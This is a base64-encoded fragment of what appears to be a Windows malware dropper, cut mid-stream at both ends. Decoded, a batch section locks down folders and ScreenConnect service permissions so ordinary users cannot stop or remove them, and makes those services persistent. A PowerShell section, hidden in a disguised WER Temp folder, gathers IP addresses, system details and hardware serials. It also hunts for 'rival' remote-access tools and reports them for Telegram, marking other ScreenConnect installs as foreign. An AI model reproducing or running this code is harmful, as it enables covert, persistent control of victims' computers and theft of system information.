bHMgIiUlfkQiIC9ncmFudCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElO
XEFkbWluaXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0KICAg
IGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICApDQopIGVsc2UgKA0K
ICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBT
QyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJz
IGJsb2NrZWQgLS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4g
Y2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQ
RFRMT0NSUkM7OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5l
eGUgc2RzZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIg
IiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNEJSIgPm51bCAyPiYx
DQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNv
bmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhB
JSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0g
ODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSBy
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNjLmV4
ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9y
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+
PiIlTE9HJSINCmV4aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlz
dCAiJVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVyaXRl
ZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVUJSIgL1IgL0QgWSA+bnVs
IDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6ciA+bnVsIDI+JjENCmljYWNscyAiJVQl
IiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJV
c2VycyIgIkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJTlRF
UkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAwDQo=
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIFRHX1JFUE9SVCBCVUlMRCAyMDI2MDgwMlQxNiAtIHJv
b3QtbGV2ZWwgdGFzayBuYW1lcyAoSURFTlRWRVI9Nyk7IFRSIG93bmVyc2hpcDsgUk1NK0RhdHRv
IGtlZXA7IGR5bmFtaWMgZ3J5eGEgRlAKcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
ICR0cnVlKV1bc3RyaW5nXSRTdGF0ZSwKICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywKICAgIFtz
dHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRl
bXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywKICAgIFtWYWxpZGF0ZVNl
dCgncmljaCcsICdjb21wYWN0JyldW3N0cmluZ10kTW9kZSA9ICdyaWNoJywKICAgIFtzdHJpbmdd
JEJ1aWxkID0gJ08xNScsCiAgICBbc3RyaW5nXSRDb3VudCA9ICcwJwopCgokRXJyb3JBY3Rpb25Q
cmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2ls
ZW50bHlDb250aW51ZScKdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQ
cm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9Cgpm
dW5jdGlvbiBHZXQtQ2ZnIHsKICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnku
Y2ZnJwogICAgJGNmZyA9IEB7fQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0
dXJuICRjZmcgfQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1P
YmplY3QgewogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9XHMq
KC4qKVxzKiQnKSB7CiAgICAgICAgICAgICRjZmdbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0u
VHJpbSgpCiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRjZmcKfQoKZnVuY3Rpb24gRXNjKFtz
dHJpbmddJHMpIHsKICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0KICAgIHJldHVy
biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNl
ICc+JywgJyZndDsnKQp9CgpmdW5jdGlvbiBHZXQtUHVibGljSXAgewogICAgZm9yZWFjaCAoJHUg
aW4gQCgKICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsCiAgICAgICAgICAgICdo
dHRwczovL2lmY29uZmlnLm1lL2lwJywKICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNv
bScKICAgICAgICApKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHIgPSBJbnZva2UtV2Vi
UmVxdWVzdCAtVXJpICR1IC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgNgogICAgICAgICAg
ICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQogICAgICAgICAgICBpZiAo
JGlwIC1tYXRjaCAnXlxkezEsM30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6Jykg
eyByZXR1cm4gJGlwIH0KICAgICAgICB9IGNhdGNoIHt9CiAgICB9CiAgICByZXR1cm4gJ24vYScK
fQoKZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsKICAgIHRyeSB7CiAgICAgICAgJGlwcyA9IEdldC1O
ZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAn
MTI3LionIC1hbmQgJF8uUHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwKICAgICAgICAg
ICAgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1VbmlxdWUKICAgICAg
ICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywgJykgfQogICAgfSBjYXRjaCB7fQog
ICAgdHJ5IHsKICAgICAgICAkaXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFw
dGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfAogICAgICAgICAgICBG
b3JFYWNoLU9iamVjdCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAk
XyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQogICAgICAgIGlmICgk
aXBzKSB7IHJldHVybiAoKCRpcHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIC1qb2luICcsICcp
IH0KICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAnbi9hJwp9CgpmdW5jdGlvbiBHZXQtT3NJbmZv
IHsKICAgICRvID0gW29yZGVyZWRdQHsKICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24g
PSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnCiAgICAgICAgRG9tYWluID0gJ24v
YSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScKICAgICAgICBDUFUgPSAn
bi9hJzsgTWFudWZhY3R1cmVyID0gJ24vYSc7IE1vZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2En
CiAgICAgICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1Np
emVfR0IgPSAnbi9hJwogICAgfQogICAgdHJ5IHsKICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFu
Y2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9u
CiAgICAgICAgJG8uVmVyc2lvbiA9ICRvcy5WZXJzaW9uCiAgICAgICAgJG8uQnVpbGQgPSAkb3Mu
QnVpbGROdW1iZXIKICAgICAgICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlCiAgICAgICAg
JG8uSW5zdGFsbERhdGUgPSAoJG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5
eS1NTS1kZCcpCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0
LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpCiAgICAgICAgJG8uVG90YWxSQU1fR0Ig
PSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
Q29tcHV0ZXJTeXN0ZW0KICAgICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikg
eyAkY3MuRG9tYWluIH0gZWxzZSB7ICRjcy5Xb3JrZ3JvdXAgfQogICAgICAgICRvLk1hbnVmYWN0
dXJlciA9ICRjcy5NYW51ZmFjdHVyZXIKICAgICAgICAkby5Nb2RlbCA9ICRjcy5Nb2RlbAogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkby5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdp
bjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5h
bWUpCiAgICB9IGNhdGNoIHt9CiAgICB0cnkgewogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2lt
SW5zdGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyCiAgICB9IGNhdGNoIHt9CiAgICB0cnkg
ewogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIg
IkRldmljZUlEPSdDOiciCiAgICAgICAgJG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRk
LkZyZWVTcGFjZSAvIDFHQiwgMSkKICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91
bmQoJGQuU2l6ZSAvIDFHQiwgMSkKICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAkbwp9CgpmdW5j
dGlvbiBHZXQtU3ZjTGluZShbc3RyaW5nXSRuYW1lKSB7CiAgICAkcyA9IEdldC1TZXJ2aWNlIC1O
YW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkcykg
eyByZXR1cm4gJ05PVCBJTlNUQUxMRUQnIH0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScg
LWYgJHMuU3RhdHVzLCAkcy5TdGFydFR5cGUpCn0KCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRoKFtz
dHJpbmddJHRuKSB7CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZP
IExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91
dCkgewogICAgICAgIHJldHVybiBAeyBQcmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lO
Ryc7IE5leHQgPSAnJzsgTGFzdCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9CiAg
ICB9CiAgICAkbWFwID0gQHt9CiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAi
JF8iIH0pIC1qb2luICJgbiIKICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsKICAgICAgICBp
ZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsKICAgICAgICAgICAg
JG1hcFskbWF0Y2hlc1sxXS5UcmltKCldID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQog
ICAgfQogICAgJHN0YXR1cyA9ICRtYXBbJ1N0YXR1cyddCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7
ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsg
JHN0YXR1cyA9ICdwcmVzZW50JyB9CiAgICAkbmV4dCA9ICRtYXBbJ05leHQgUnVuIFRpbWUnXQog
ICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9CiAgICAkbGFzdCA9ICRtYXBbJ0xhc3Qg
UnVuIFRpbWUnXQogICAgaWYgKC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9CiAgICAkcmVzdWx0
ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
JycgfQogICAgJHRyID0gJG1hcFsnVGFzayBUbyBSdW4nXQogICAgaWYgKC1ub3QgJHRyKSB7ICR0
ciA9ICRtYXBbJ1Rhc2sgdG8gUnVuJ10gfQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kp
b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAg
IyBQcmVzZW50IFdpbmRvd3MgYnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkg
Zm9yIHVzCiAgICAkaGVhbHRoeSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8
UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKSkKICAgIHJldHVybiBAewogICAg
ICAgIFByZXNlbnQgPSAkdHJ1ZQogICAgICAgIE91cnMgICAgPSBbYm9vbF0kb3VycwogICAgICAg
IEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRoeQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3Vycykg
eyAkc3RhdHVzIH0gZWxzZSB7ICdOT1RfT1VSUycgfSkKICAgICAgICBOZXh0ICAgID0gJG5leHQK
ICAgICAgICBMYXN0ICAgID0gJGxhc3QKICAgICAgICBSZXN1bHQgID0gJHJlc3VsdAogICAgICAg
IFRyICAgICAgPSAkKGlmICgkdHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pCiAgICB9Cn0KCmZ1bmN0
aW9uIEdldC1SbW1IaXRzIHsKICAgICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6
IFNjcmVlbkNvbm5lY3QgYWxsb3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuCiAgICAkdG9rZW5z
ID0gQCgKICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0Fn
ZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywKICAgICAgICAnV2lu
Vk5DJywgJ3ZuY3NlcnZlcicsICd0dl8nLCAnU3BsYXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1
c3REZXNrJywgJ1JlbW90ZVBDJywgJ0RhbWVXYXJlJywKICAgICAgICAnQXRlcmFBZ2VudCcsICdB
dGVyYScsICdOaW5qYVJNTScsICdOaW5qYU9uZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScs
ICdBZ2VudE1vbicsICdQdWxzZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8n
LAogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENl
bnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lz
ZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAnTGFiVGVjaCcsCiAgICAgICAgJ0FjdGlvbjEnLCAn
U2ltcGxlSGVscCcsICdCb21nYXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2gg
Q2VudHJhbCcsICdNZXNoIEFnZW50JywKICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxy
bW0nLCAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywK
ICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0Jywg
J0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywKICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAn
TmF2ZXJpc2snLCAnSW1teUJvdCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJl
cicsICdEb21vdHonLCAnQXV2aWsnLAogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQg
V29ya3BsYWNlJywgJ0dvdmVybGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQ
RFEgQ29ubmVjdCcsCiAgICAgICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdU
YWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcics
ICdBZXJvQWRtaW4nLAogICAgICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5l
JywgJ0lwZXJpdXMnLCAnSVNMIExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1VsdHJhVk5D
JywgJ1JlYWxWTkMnCiAgICApCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0
YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2ludCcpCiAgICAkaGl0cyA9IE5ldy1P
YmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkc2VlbiA9
IEB7fQoKICAgIGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkg
ewogICAgICAgICRrZXkgPSAiJGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQogICAgICAg
IGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQogICAgICAgICRzZWVuWyRr
ZXldID0gJHRydWUKICAgICAgICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwv
Y29kZT4nIC1mICRraW5kLCAoRXNjICRuYW1lKSkpCiAgICB9CiAgICBmdW5jdGlvbiBUZXN0LUtl
ZXBOYW1lKFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNl
IH0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVl
IH0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcFRva2VucykgeyBpZiAoJHMgLWxpa2UgIiok
ayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAg
R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
dCB7CiAgICAgICAgJG4gPSAkXy5OYW1lCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQogICAg
ICAgIGlmIChUZXN0LUtlZXBOYW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7CiAgICAgICAg
ICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAt
b3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNlKicpIHsKICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tl
ZXAtZGF0dG8nICgiJG4gKCQoJF8uU3RhdHVzKSkiKQogICAgICAgICAgICB9CiAgICAgICAgICAg
IHJldHVybgogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7CiAgICAg
ICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgewogICAgICAg
ICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikKICAgICAgICAgICAg
ICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgR2V0LVByb2Nlc3Mg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAg
JG4gPSAkXy5Qcm9jZXNzTmFtZQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7IHJldHVy
biB9CiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2VucykgewogICAgICAgICAgICBpZiAoJG4g
LWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbgogICAgICAg
ICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkdW5pbnN0
ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZl
cnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxN
aWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicKICAgICkKICAgIGZv
cmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRo
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAg
ICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0
dXJuIH0KICAgICAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7CiAgICAgICAgICAgICAg
ICBpZiAoJGRuIC1saWtlICcqRGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykg
eyBBZGQtSGl0ICdrZWVwLWRhdHRvJyAkZG4gfQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAg
ICAgICAgIH0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJl
dHVybiB9CiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsKICAgICAgICAgICAg
ICAgIGlmICgkZG4gLWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAn
bXNpJyAkZG4KICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAg
ICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkaGl0cwp9CgpmdW5jdGlvbiBH
ZXQtR3J5eGFLZWVwRnAgewogICAgJGZwID0gJzk5MDgxOThlNjY4ZTQ3NTAnCiAgICAkcCA9ICdD
OlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5j
ZmcnCiAgICBpZiAoJFdvcmtEaXIpIHsgJHAgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhLmNm
ZycgfQogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsKICAgICAgICBHZXQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
YWNoLU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05
YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0KICAgICAg
ICB9CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9uIEdldC1TY0luc3RhbGxzIHsKICAg
ICRncnl4YUZwID0gR2V0LUdyeXhhS2VlcEZwCiAgICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVt
LkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICBHZXQtU2VydmljZSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1Nj
cmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAkZnAgPSBp
ZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBl
bHNlIHsgJz8nIH0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcn
KSB7ICdLRUVQLVNFVlJaJyB9CiAgICAgICAgZWxzZWlmICgkZnAgLWVxICdmODYxYzgxNDBkNDUz
NDI3JykgeyAnS0VFUC1BTFQnIH0KICAgICAgICBlbHNlaWYgKCRmcCAtZXEgJGdyeXhhRnApIHsg
J0tFRVAtR1JZWEEnIH0KICAgICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0KICAgICAgICBbdm9pZF0k
bGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1mIChFc2Mg
JF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcpKQogICAgfQoKICAgICRy
b290cyA9IEAoCiAgICAgICAgIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGll
bnQqIiwKICAgICAgICAiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xp
ZW50KiIKICAgICkKICAgIGZvcmVhY2ggKCRwYXQgaW4gJHJvb3RzKSB7CiAgICAgICAgR2V0LUNo
aWxkSXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0
